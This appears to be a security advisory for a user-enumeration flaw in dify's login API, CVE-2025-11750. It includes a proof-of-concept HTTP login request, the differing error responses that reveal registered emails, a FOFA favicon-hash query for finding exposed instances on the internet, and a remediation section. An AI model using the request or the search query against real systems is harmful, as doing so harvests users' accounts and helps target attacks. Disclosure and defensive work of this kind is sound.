# CVE-2025-11750 - User Enumeration in langgenius/dify Login API

## Vulnerability Overview
A **user enumeration** vulnerability exists in **langgenius/dify** (open-source AI application platform) that allows an unauthenticated attacker to determine whether a given email address is registered on the target instance.

The login API endpoint (`/console/api/login`) returns different error codes and messages depending on whether the provided email exists in the system:

- **Non-existent email** → `{"code": "account_not_found", "message": "Account not found.", "status": 400}`
- **Existing email (wrong password)** → Different error (typically `invalid_password` or similar)

This behavioral difference enables attackers to harvest valid user accounts by automating login attempts with different email addresses.

| Attribute              | Details                                                                 |
|------------------------|-------------------------------------------------------------------------|
| **Product**            | dify                                                                    |
| **Vendor**             | langgenius                                                              |
| **Vulnerability Type** | User Enumeration (CWE-203: Observable Behavioral Discrepancy)           |
| **CVE**                | [CVE-2025-11750](https://www.cve.org/CVERecord?id=CVE-2025-11750)       |
| **Severity**           | Medium (information disclosure, enables targeted attacks)              |
| **Affected Endpoint**  | `POST /console/api/login`                                               |
| **Public Disclosure**  | Yes                                                                     |
| **Patch Status**       | Fixed in later versions (check official repository for exact fix)      |

## Proof of Concept (PoC)

### Request (non-existent email)
```http
POST /console/api/login HTTP/1.1
Host: site.local
Content-Type: application/json
Content-Length: 92

{
  "email": "nonexistent12345@example.com",
  "password": "any-password",
  "language": "en-EN",
  "remember_me": true
}


{
  "code": "account_not_found",
  "message": "Account not found.",
  "status": 400
}



When the email does exist but the password is incorrect, a different error code/message is returned (e.g., invalid_password), allowing reliable enumeration.


Detection (FOFA Query)
Instances potentially vulnerable can be identified using the following FOFA dork:

icon_hash="97378986"

This hash corresponds to the default Dify favicon.


### References
- Huntr Bug Bounty Report: https://huntr.com/bounties/e7359f9f-c004-4304-9de9-753622d370a1
- Official CVE Record: https://www.cve.org/CVERecord?id=CVE-2025-11750
- Project Repository: https://github.com/langgenius/dify

### Timeline
- Discovered and reported by Iyad Alkhatib (Hack4fun)
- Reported via Huntr platform
- CVE-2025-11750 assigned
- Public disclosure: 2025

### Remediation
Upgrade to the latest version of dify (check release notes after the disclosure date for the exact fixed version).  
The fix implements a generic error message (e.g., "Invalid email or password") for all failed login attempts, regardless of whether the account exists.
